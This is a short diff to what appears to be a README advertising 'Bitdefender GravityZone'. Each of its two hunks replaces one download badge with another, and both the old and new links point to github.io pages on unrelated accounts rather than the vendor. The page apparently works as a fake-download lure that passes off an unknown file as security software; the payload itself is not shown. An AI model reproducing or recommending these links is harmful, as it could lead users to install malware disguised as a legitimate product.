@@ -5,11 +5,8 @@
 </div>  
 <br>
 
-<div align="center">
+[![GET bitdefender gravityzone](https://img.shields.io/badge/GET%20%E2%80%94%20bitdefender-gravityzone-0078D6?style=for-the-badge&logoColor=white)](https://paradisemsninneman.github.io/.github/bitdefender-gravityzone)
 
-[![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://bitdefender-gravityzone-enterproguard.github.io/.github/)
-
-</div>
 
 ---
 
@@ -26,11 +23,8 @@
   <img src="https://www.security.org/app/uploads/2020/12/Bitdefender-Dashboard-Screenshot.png" width="800"/> 
 </div>
 
-<div align="center">
+[![GET bitdefender gravityzone](https://img.shields.io/badge/GET%20%E2%80%94%20bitdefender-gravityzone-0078D6?style=for-the-badge&logoColor=white)](https://paradisemsninneman.github.io/.github/bitdefender-gravityzone)
 
-[![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://bitdefender-gravityzone-enterproguard.github.io/.github/)
-
-</div>
 
 ---
 
